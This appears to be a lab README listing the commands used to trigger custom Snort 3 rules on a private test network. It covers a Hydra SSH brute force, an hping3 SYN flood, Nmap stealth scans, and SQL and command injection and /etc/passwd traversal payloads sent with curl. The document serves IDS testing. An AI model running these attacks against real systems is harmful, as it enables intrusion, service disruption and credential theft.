# Test Commands

This document contains the commands used to generate the traffic that triggered the custom Snort 3 detection rules.

> **Lab Network**
>
> - **Attacker (Kali Linux):** `192.168.10.15`
> - **Victim (Ubuntu):** `192.168.10.5`
> - **Monitoring (Snort 3 + Wireshark):** `192.168.10.10`
> - **Network:** `192.168.10.0/24`

---

# Start Snort

Run Snort before executing any attack.

```bash
sudo snort \
-c /etc/snort/snort.lua \
-R rules/local.rules \
-i eth0 \
-A alert_fast
```

---

# 1. SSH Brute Force

**Rule SID:** `1000001`

Generate multiple SSH authentication attempts using Hydra.

```bash
hydra -l test -P passwords.txt ssh://192.168.10.5
```

---

# 2. SYN Flood

**Rule SID:** `1000002`

Generate a TCP SYN flood against the victim's web server.

```bash
sudo hping3 -S --flood -p 80 192.168.10.5
```

Stop with:

```text
Ctrl + C
```

---

# 3. High Frequency DNS Queries

**Rule SID:** `1000003`

Send a large number of DNS queries in a short period.

```bash
for i in {1..120}; do
    dig test$i.example.com @192.168.10.5
done
```

---

# 4. Large DNS Query (DNS Tunneling Indicator)

**Rule SID:** `1000004`

Generate an oversized DNS query.

```bash
dig $(python3 -c "print('A'*60+'.'+'B'*60+'.'+'C'*60)") @192.168.10.5
```

---

# 5. ICMP Exfiltration

**Rule SID:** `1000005`

Send oversized ICMP Echo Requests.

```bash
ping -s 600 192.168.10.5
```

---

# 6. TCP SYN Port Scan

**Rule SID:** `1000006`

Perform a SYN scan using Nmap.

```bash
sudo nmap -sS -p 1-1000 192.168.10.5
```

---

# 7. TCP NULL Scan

**Rule SID:** `1000007`

Perform a NULL scan.

```bash
sudo nmap -sN 192.168.10.5
```

---

# 8. TCP XMAS Scan

**Rule SID:** `1000008`

Perform a XMAS scan.

```bash
sudo nmap -sX 192.168.10.5
```

---

# 9. FTP Connection

**Rule SID:** `1000009`

Connect to the FTP server.

```bash
ftp 192.168.10.5
```

---

# 10. SQL Injection

**Rule SID:** `1000010`

Generate a SQL injection attempt.

```bash
curl "http://192.168.10.5/index.php?id=1%27%20UNION%20SELECT%201"
```

Alternative:

```bash
curl "http://192.168.10.5/login.php?user=admin%27%20OR%20%271%27=%271"
```

---

# 11. Command Injection

**Rule SID:** `1000011`

Generate a command injection attempt.

```bash
curl "http://192.168.10.5/?cmd=ls;whoami"
```

Alternative:

```bash
curl "http://192.168.10.5/?cmd=id|whoami"
```

---

# 12. Access to `/etc/passwd`

**Rule SID:** `1000012`

Attempt to access the passwd file through the web server.

```bash
curl "http://192.168.10.5/../../etc/passwd"
```

Alternative:

```bash
curl "http://192.168.10.5/%2e%2e/%2e%2e/etc/passwd"
```

---

# 13. Suspicious User-Agent

**Rule SID:** `1000013`

Send an HTTP request using the `sqlmap` User-Agent.

```bash
curl -A "sqlmap" http://192.168.10.5/
```

---

# Notes

- Execute one attack at a time to simplify analysis.
- Start packet capture in Wireshark before running each command.
- Verify that Snort generates the expected alert.
